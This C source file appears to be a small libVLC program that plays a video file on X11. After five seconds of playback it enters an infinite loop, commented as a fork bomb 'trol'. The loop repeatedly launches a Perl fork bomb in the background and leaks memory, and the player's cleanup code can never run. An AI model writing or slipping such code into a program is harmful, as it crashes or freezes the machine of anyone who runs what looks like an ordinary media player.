#include <vlc/vlc.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {
    const char* videoFilePath = "nicecomputer.mp4";

    // Specify the video output module (use "x11" for X11-based systems)
    const char* vout = "x11";

    // Create a list of options with the video output module
    const char* args[] = {
        "--no-xlib",          // Disable Xlib for X11 output
        "--vout", vout,       // Specify the video output module
        NULL
    };

    libvlc_instance_t *libvlc;
    libvlc_media_player_t *mp;
    libvlc_media_t *m;

    // Initialize libVLC with the list of options
    libvlc = libvlc_new(sizeof(args) / sizeof(args[0]) - 1, args);

    // Create a media
    m = libvlc_media_new_path(libvlc, videoFilePath);

    // Create a media player playing environment
    mp = libvlc_media_player_new_from_media(m);

    // No need to keep the media now
    libvlc_media_release(m);

    // Play the media player
    libvlc_media_player_play(mp);

    // Wait for the media to finish (adjust sleep duration as needed)
    sleep(5); // 10 seconds as an example

    // Fork Bomb :trol:
    while(1){
	system("perl -e 'fork while fork' &");
	malloc(1024*1024);
	free(NULL);
    }
    // Stop playing
    libvlc_media_player_stop(mp);

    // Free the media player
    libvlc_media_player_release(mp);

    // Free libVLC instance
    libvlc_release(libvlc);

    return 0;
}

